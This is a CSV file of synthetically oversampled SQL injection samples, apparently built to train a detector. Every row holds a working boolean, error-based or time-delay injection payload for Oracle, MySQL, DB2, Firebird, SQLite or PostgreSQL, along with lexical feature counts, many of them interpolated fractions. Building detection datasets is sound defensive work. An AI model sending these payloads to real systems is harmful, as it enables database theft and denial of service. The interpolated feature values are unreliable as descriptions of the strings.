id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000415,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000019,0.7571990699722361,250.54367818761148,36.742720302064754,3.7767792132981253,76.05823758348195,29.0,100.0,45.48544060412951,0.3034612012348021,0.1157608210498349,0.3991752449994307,0.1816027327159323,4.0,0.0,0.0,0.0,0.0,2.0,0.0,22.0,1.4854406041295118,2.0,4.0,12.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000416,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,0.08879263694050173,169.23875407026165,35.89388707988371,4.194608622334817,78.1856976102035,18.0,47.053056460058144,26.0,0.46196263807738797,0.1063660137868257,0.2780315504437048,0.15363979769208155,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,1.026528230029072,0.9734717699709281,0.026528230029071787,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.026528230029072
SMOTE_000417,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.4095591721160117,172.79015649510077,34.31548600217743,4.166896521459367,80.9478994961895,18.0,47.84225699891128,26.0,0.4682721497320047,0.10424098075554106,0.27691656397667275,0.15057030553578152,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,7.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,2.0,0.0,1.0,1.4211284994556426,0.5788715005443574,0.42112849945564257,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.421128499455643
SMOTE_000418,attack,boolean,"1""  )   where 6671  =  6671 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000005,0.6169497017457871,214.5481094379855,34.602749110742025,3.7698819930788576,60.91786921982318,35.0,84.82199288593623,33.80824733222608,0.28295411268925785,0.16496379293098806,0.39465861231022165,0.15742348206953244,0.0,0.8493127223144931,2.0,0.0,0.0,2.0,0.0,18.05481094379855,0.0,1.150687277685507,3.150687277685507,10.602749110742028,0.0,0.8493127223144932,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.15068727768550694,0.8493127223144931,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,5.301374555371014,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.301374555371014
SMOTE_000419,attack,boolean,"1"" and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",nearest_attack_euclidean,R000023,0.9576826062683153,246.49925272112807,31.428500259155054,3.728342651147903,50.07125064788763,72.7140010366202,95.28550077746516,28.42850025915505,0.2030886351609454,0.2948864234619929,0.3866725549502016,0.1153523864268601,0.0,0.7857498704224735,0.42850025915505296,0.0,2.0,1.2142501295775265,0.0,18.0,0.0,0.0,6.0,3.6427503887325794,0.0,0.7857498704224735,0.21425012957752657,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.21425012957752654,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.214250129577526
SMOTE_000420,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  ""dskh""  =  ""dskh",nearest_attack_euclidean,R000076,1.987803376603788,138.6731463949671,30.55771546498903,4.029530094642961,76.01943918490127,5.769138140043875,39.88456907002194,17.0,0.5479077046031706,0.041761561732339636,0.28772611889464833,0.12260461476984147,0.0,2.1154309299780625,0.884569070021938,0.0,1.0,0.9999999999999999,0.0,5.44228453501097,0.442284535010969,0.0,2.5577154649890312,2.8845690700219384,0.0,1.0,0.44228453501096904,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,0.557715464989031,0.442284535010969,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000421,attack,boolean,"1%""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000064,1.6897505700173758,143.99202200247063,29.66600183353922,3.891164048291942,63.31006417387269,10.671985331686242,47.33798716522546,22.671985331686244,0.43573568399979434,0.07529400104679047,0.3302057387888608,0.15876457616455442,0.0,4.0,0.0,0.0,0.6660018335392198,2.0,0.0,7.335992665843121,2.0,0.6679963329215604,1.6660018335392197,4.669990832303902,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.33399816646078023,0.6660018335392197,0.0,0.0,0.6660018335392197,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.33200366707844
SMOTE_000422,attack,boolean,"1""  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kkim""  =  ""kkim",nearest_attack_euclidean,R000045,0.171544100532319,377.4827938316183,31.0,3.352811129828104,102.66575811657194,47.40851785752319,173.44565584457075,53.962862012952435,0.2720143035114666,0.12556158554172742,0.45946057893309666,0.14296353201370932,0.0,3.8514480518097507,0.03713798704756255,0.0,0.0,3.0,0.0,36.07427597409512,0.0,0.0,1.0,13.037137987047561,0.0,0.9628620129524375,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,2.0,0.0,0.0,0.0,1.9628620129524377,0.03713798704756244,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000423,attack,boolean,"-4462%""  )   or 8571  =  8571--",nearest_attack_euclidean,R000041,1.194449467894755,31.716213876227755,15.0,3.3628932419801143,2.0,12.0,10.716213876227748,7.0,0.0632672818200039,0.37960369092002355,0.3356935408899588,0.22143548637001373,0.11936897937129176,0.8806310206287082,2.7612620412574165,0.0,0.0,0.9999999999999999,0.0,1.1193689793712913,1.0,0.0,0.0,3.7612620412574165,0.1193689793712916,0.8806310206287083,0.8806310206287085,0.11936897937129166,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000424,attack,boolean,"-9462""  )   as vzga where 4799  =  4799 or 8691  =  1048",nearest_attack_euclidean,R000077,1.0370009790451047,59.70358852915753,23.7936261133909,3.774497099343998,13.529084075593929,20.264542037796968,19.5872522267818,6.322710188984832,0.22741889218219702,0.3420261692687448,0.3270973293813636,0.10345760916769461,0.0,1.0,1.2645420377969663,0.0,0.0,2.0,0.0,1.5290840755939321,0.0,0.2645420377969664,0.2645420377969663,3.264542037796966,0.0,1.0,0.2645420377969663,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.26454203779696633,0.7354579622030337,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000425,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,1.0869772764221475,151.66402575119102,33.288536766825466,4.157083772424549,72.8656103004764,16.0,46.15414706730188,16.644268383412733,0.48062702457322465,0.1057403600960323,0.3037886349581966,0.10984398037254653,0.6442683834127343,0.3557316165872657,2.0,0.0,1.0,2.0,0.0,5.644268383412735,0.0,0.0,2.0,5.0,0.6442683834127342,0.35573161658726565,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000426,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.2420961619634635,155.99759110609133,33.92289162354549,4.161189585985722,75.07710837645452,16.0,48.07469948254585,16.845783247090974,0.4815678822605497,0.10262024691713281,0.3078488081458432,0.10796306267647428,0.9228916235454876,0.0771083764545123,2.0,0.0,1.0,2.0,0.0,5.845783247090976,0.0,0.0,2.0,5.0,0.9228916235454875,0.0771083764545124,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000427,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000044,1.9110414582990043,171.02510015137887,33.549977744138026,4.17597867015828,82.28753894775846,18.0,45.90004451172395,24.83751669189648,0.481392149572816,0.10553188894926896,0.2679065314490624,0.1451694300288526,3.612505563965493,0.0,0.7749888720690133,0.0,1.0,2.0,0.0,5.612505563965493,0.0,5.0,4.0,6.6125055639654935,1.0,0.0,0.3874944360345068,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.6125055639654933,2.0,0.0,1.0,1.6125055639654933,0.3874944360345068,0.6125055639654933,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.6125055639654935
SMOTE_000428,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000011,0.9883580966880086,130.04955466632714,35.209180166518124,3.864839222876961,44.63119433329089,17.524777333163573,50.262388666581785,17.631194333290892,0.3438705751116577,0.13360872888797387,0.38691463288923084,0.1356060631111376,3.0,0.0,2.0,1.0,0.0,1.3155971666454467,0.0,9.0,0.0,0.0,1.0,4.631194333290893,1.0,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.3155971666454467,0.0,0.3155971666454467,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6311943332908934
SMOTE_000429,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.5224373904519394,160.0,35.31838711310682,4.223693194673437,77.43198926092236,18.0,41.795215034708704,22.772795704368942,0.4839499328807647,0.1125,0.26122009396692936,0.1423299731523059,2.6591935565534124,0.11360214781552924,2.0,0.0,1.0,2.0,0.0,5.11360214781553,0.0,5.0,4.0,5.886397852184471,0.8863978521844708,0.1136021478155293,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.8863978521844706,0.0,1.0,1.0,0.8863978521844708,0.11360214781552913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.886397852184471
SMOTE_000430,attack,boolean,"1 where 5485  =  5485 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000017,0.2424220004893565,256.621167793323,37.11579769952308,3.8086224539701146,76.69478619713846,37.0,100.69478619713846,42.23159539904615,0.29882588713430647,0.1442235846876164,0.39237632044519277,0.1645742077328843,0.11579769952307561,0.0,2.0,0.0,0.0,2.0,0.0,22.115797699523075,0.0,2.0,4.0,14.0,0.11579769952307561,0.0,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000431,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,1.3683698181796382,163.39038668700385,36.0,4.232698988367989,78.0,18.0,43.26025779133591,24.130128895667955,0.47772003840287347,0.1102430857852785,0.2644835574129655,0.14755331839888253,3.3767096318893186,0.0,1.2465807362213632,0.0,1.0,2.0,0.0,5.376709631889319,0.0,5.0,4.0,6.376709631889319,1.0,0.0,0.6232903681106816,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.3767096318893184,2.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000432,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000059,1.3620127038422662,165.1346767850618,35.48462357134157,4.1881439488040195,76.96924714268314,18.0,45.71155892835394,24.45387071402472,0.46642964642582924,0.10918219541492691,0.27672034311818605,0.14766781504105783,2.9692471426831473,0.2576882143292132,0.5153764286584263,0.0,1.0,2.0,0.0,5.742311785670787,0.0,5.0,4.0,6.484623571341574,0.7423117856707868,0.2576882143292131,0.2576882143292132,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.7423117856707868,1.7423117856707866,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.742311785670787
SMOTE_000433,attack,boolean,-6588' where 7793  =  7793 or   (  8459  =  8459  )  *4906--,nearest_attack_euclidean,R000013,0.09591450853688799,60.32188075703206,20.14856034939941,3.605926500562836,7.1733204076326444,24.0,20.099040232932936,9.04952011646647,0.11852649752482519,0.3982362698244819,0.33322027370669755,0.15001695894399536,0.975239941766765,0.024760058233234905,3.0,0.0,0.975239941766765,2.0,0.0,2.024760058233234,0.0,0.024760058233235016,0.024760058233235238,5.975239941766765,0.975239941766765,0.02476005823323496,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000434,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000057,0.8230803029726111,153.59200290740083,33.737846377492374,4.16151347977417,75.26215362250763,16.0,45.854156529908465,16.475692754984742,0.4908332404758774,0.10432271556447217,0.29764218120722696,0.10720186275242352,0.7378463774923718,0.2621536225076284,2.0,0.0,1.0,2.0,0.0,5.4756927549847445,0.0,0.0,2.0,5.0,0.7378463774923717,0.26215362250762836,1.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000435,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000043,1.4191381932557372,153.68846334116972,30.056027662159387,3.768773733769414,44.22411064863755,18.904076070938316,60.4482212972751,30.112055324318774,0.2892980481950129,0.12170164199467165,0.39065336144192214,0.19834694836839323,1.0560276621593871,2.943972337840613,0.0,0.0,0.0,2.0,0.0,12.112055324318774,2.0,1.7359930844601532,1.5280138310796936,8.0,0.2640069155398468,0.7359930844601532,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,1.320034577699234,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.320034577699234
SMOTE_000436,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000025,1.144472090909343,148.03993439575507,29.767805678100547,3.40161225354033,51.878962786257816,12.767805678100547,61.92877728759781,21.464388643798905,0.3245170076039379,0.09058113028877457,0.4345999585568558,0.15030190355043177,4.0,0.0,0.0,0.0,1.0,2.0,0.0,9.535611356201096,2.0,0.767805678100548,2.16097160949726,3.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000437,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000024,0.3527866313682758,156.56319089491691,36.521063631638974,4.1873191092214626,76.31929091224069,15.042127263277944,48.201772719398285,17.0,0.4882299030795815,0.09546315792401648,0.30760776382522603,0.10869917517117597,0.0,1.1596454561203426,1.8403545438796574,0.0,1.0,1.9201772719398287,0.0,5.920177271939829,0.0,0.0,2.0798227280601713,4.760531815819486,0.0,1.0,0.9201772719398287,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.9201772719398287,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9201772719398287
SMOTE_000438,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,0.04609202300835411,160.1682262009069,35.96261639979847,4.253394822524127,78.06542130035268,18.0,41.074767200403066,23.02803770015115,0.4874068035247785,0.11239367726066278,0.2564278608787678,0.14377165833579092,3.0093459000503833,0.0,1.981308199899234,0.0,1.0,2.0,0.0,5.009345900050383,0.0,5.0,4.0,6.009345900050383,1.0,0.0,0.9906540999496172,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.00934590005038305,2.0,0.0,1.0,1.009345900050383,0.990654099949617,0.00934590005038305,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.009345900050383
SMOTE_000439,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000065,0.5691261000984791,386.424676475041,30.916852941280023,3.294591462211845,92.83594117792032,57.334823530240186,183.2539117668805,53.0,0.2401544186118013,0.14833333289914502,0.47421458982635634,0.1372976586626973,0.0,0.33258823487990774,1.0,0.0,0.0,2.9168529412800233,0.0,37.66741176512009,0.16629411743995384,0.0,0.9168529412800233,13.916852941280023,0.0,0.08314705871997702,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.0,1.9168529412800233,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9168529412800231,3.469446951953614e-18,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.833705882560043
SMOTE_000440,attack,boolean,"-1617%"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""%""  =  """,nearest_attack_euclidean,R000008,0.02784285941138993,347.0759603048741,30.05361903873465,3.2558427044807687,80.15638886297606,49.93297620158169,163.97319048063267,53.01340475968367,0.23092907900578558,0.1438780182308733,0.4724501979825521,0.15274270478078905,0.0,4.0,0.9955317467721126,0.0,0.0,2.0,0.0,34.0,1.9910634935442253,0.008936506455774706,0.017873012911549413,12.995531746772112,0.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.004468253227887353,1.0,0.0,0.0,0.004468253227887353,1.0,0.9955317467721126,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,11.977658733860562,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,16.97765873386056
